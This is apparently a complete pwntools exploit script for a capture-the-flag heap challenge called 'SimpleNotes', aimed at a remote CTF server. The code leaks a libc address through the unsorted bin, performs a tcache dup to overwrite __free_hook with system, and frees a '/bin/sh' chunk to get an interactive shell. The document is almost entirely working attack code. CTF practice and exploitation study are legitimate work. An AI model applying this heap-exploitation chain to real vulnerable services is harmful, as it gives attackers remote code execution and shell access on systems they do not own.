#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./SimpleNotes")
libc = ELF("libc.so.6")
ld = ELF("ld-2.27.so")
context.binary = exe

#io = gdb.debug(exe.path, 'c', api=True)
io = remote('pwn.1nf1n1ty.team', 32229)

def malloc(id, size, data):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b': ', str(id).encode())
    io.sendlineafter(b': ', str(size).encode())
    io.sendafter(b': ', data)

def edit(id, size, data):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b': ', str(id).encode())
    io.sendlineafter(b': ', str(size).encode())
    io.sendafter(b': ', data)

def free(id):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b': ', str(id).encode())

def read(id):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', str(id).encode())
    return io.recvline()

# leak libc address
for i in range(7):
    malloc(i, 0x88, b'a'*0x88)

malloc(7, 0x88, b'b'*0x88)
malloc(8, 0x88, b'b'*0x88)
malloc(9, 0x88, b'b'*0x88)
malloc(10, 0x88, b'b'*0x88)

for i in range(7):
    free(i)

free(7)
free(9)
libc.address = unpack(read(7).strip(), 'all')-0x3ebca0

for i in range(9):
    malloc(i, 0x88, b'a'*0x88)

# tcache dup
for i in range(7):
    malloc(i, 0x18, b'a'*0x18)

malloc(7, 0x18, b'b'*0x18)

for i in range(7):
    free(i)

free(7)

for i in range(7):
    malloc(i, 0x18, b'a'*0x18)

free(7)

malloc(0, 0x18, p64(libc.sym.__free_hook-16))
malloc(1, 0x18, b'/bin/sh\x00')
malloc(0, 0x18, p64(libc.sym.system))

free(1)

io.interactive()
